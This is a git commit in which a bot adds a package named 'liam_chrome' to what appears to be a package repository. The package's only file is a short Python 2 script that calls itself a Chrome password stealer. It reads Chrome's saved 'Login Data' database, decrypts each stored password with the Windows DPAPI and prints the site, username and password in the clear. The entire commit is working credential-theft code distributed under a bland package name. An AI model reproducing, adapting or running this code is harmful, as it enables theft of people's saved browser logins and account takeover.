cbcc6af04c41acfd85ad49a91fb693e005a2eebe
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 18:41:43 +0000

    Add package liam_chrome/0.1/liam_chrome-0.1.zip

---
+++ packages/liam_chrome/liam_chrome-0.1.zip/liam_chrome-0.1/liam_chrome.py
@@ -0,0 +1,17 @@
+#chrome cache password stealer by liam giannini
+
+from os import getenv
+import sqlite3
+import win32crypt
+
+cursor = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data").cursor()
+cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+for result in cursor.fetchall():
+    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
+    if password:
+        print 'Site: ' + result[0]
+        print 'Username: ' + result[1]
+        print 'Password: ' + password
+        print
+
+raw_input()
